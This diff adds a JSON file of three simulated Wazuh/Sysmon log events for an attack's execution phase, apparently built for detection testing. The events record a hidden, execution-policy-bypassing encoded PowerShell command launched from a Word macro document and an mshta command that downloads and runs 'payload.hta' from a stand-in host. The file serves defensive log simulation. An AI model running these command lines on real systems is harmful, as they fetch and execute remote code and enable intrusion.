@@ -1,0 +1,231 @@
+{
+  "_metadata": {
+    "phase": "execution",
+    "phase_index": 1,
+    "total_logs": 3,
+    "techniques": [
+      "T1059.001",
+      "T1218.005"
+    ]
+  },
+  "logs": [
+    {
+      "_comment": "PowerShell execution from Office macro (Sysmon)",
+      "sequence": 9,
+      "timestamp": "2026-02-24T08:00:51.900254Z",
+      "attack_phase": "execution",
+      "technique": "T1059.001",
+      "host": "WS01",
+      "log": {
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: Process creation",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1059.001"
+            ],
+            "tactic": [
+              "Execution"
+            ],
+            "technique": [
+              "T1059.001"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "WS01",
+          "ip": "10.0.10.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-24 08:00:51.900",
+              "processGuid": "{FD12E5CD-WS01-0007-E93B7DE92867}",
+              "processId": "1703",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "commandLine": "powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAIAAo...",
+              "currentDirectory": "C:\\Users\\Public\\",
+              "user": "CORP\\user1",
+              "integrityLevel": "High",
+              "hashes": "SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C",
+              "parentProcessGuid": "{FD12E5CD-WS01-0006-161C0DEED523}",
+              "parentProcessId": "1663",
+              "parentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+              "parentCommandLine": "\"WINWORD.EXE\" /n \"C:\\Users\\user1\\Downloads\\Invoice.docm\""
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "PowerShell execution from Office macro (Security)",
+      "sequence": 10,
+      "timestamp": "2026-02-24T08:00:55.639408Z",
+      "attack_phase": "execution",
+      "technique": "T1059.001",
+      "host": "WS01",
+      "log": {
+        "rule": {
+          "level": 10,
+          "description": "Windows Security Event 4688",
+          "id": "100688",
+          "mitre": {
+            "id": [
+              "T1059.001"
+            ],
+            "tactic": [
+              "Execution"
+            ],
+            "technique": [
+              "T1059.001"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "windows",
+            "windows_security"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "WS01",
+          "ip": "10.0.10.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "4688",
+              "channel": "Security",
+              "providerName": "Microsoft-Windows-Security-Auditing",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "4688",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "subjectUserSid": "S-1-5-21-1234567890-1234567890-1234567890-1001",
+              "subjectUserName": "user1",
+              "subjectDomainName": "CORP",
+              "subjectLogonId": "0x3E7",
+              "newProcessId": "0x6A7",
+              "newProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "tokenElevationType": "%%1937",
+              "processId": "0x67F",
+              "commandLine": "powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAIAAo...",
+              "targetUserSid": "S-1-5-21-1234567890-1234567890-1234567890-1001",
+              "targetUserName": "user1",
+              "targetDomainName": "CORP",
+              "targetLogonId": "0x3E7",
+              "parentProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+              "mandatoryLabel": "S-1-16-12288"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "MSHTA execution (LOLBin)",
+      "sequence": 15,
+      "timestamp": "2026-02-24T08:01:21.434986Z",
+      "attack_phase": "execution",
+      "technique": "T1218.005",
+      "host": "WS01",
+      "log": {
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: Process creation",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1218.005"
+            ],
+            "tactic": [
+              "Execution"
+            ],
+            "technique": [
+              "T1218.005"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "001",
+          "name": "WS01",
+          "ip": "10.0.10.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-24 08:01:21.434",
+              "processGuid": "{FD12E5CD-WS01-0011-5621DF0C847C}",
+              "processId": "2129",
+              "image": "C:\\Windows\\System32\\mshta.exe",
+              "commandLine": "mshta http://update-cdn.com/payload.hta",
+              "currentDirectory": "C:\\Windows\\System32\\",
+              "user": "CORP\\user1",
+              "integrityLevel": "Medium",
+              "parentProcessGuid": "{FD12E5CD-WS01-0010-E8611C5F939F}",
+              "parentProcessId": "2055",
+              "parentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"
+            }
+          }
+        }
+      }
+    }
+  ]
+}
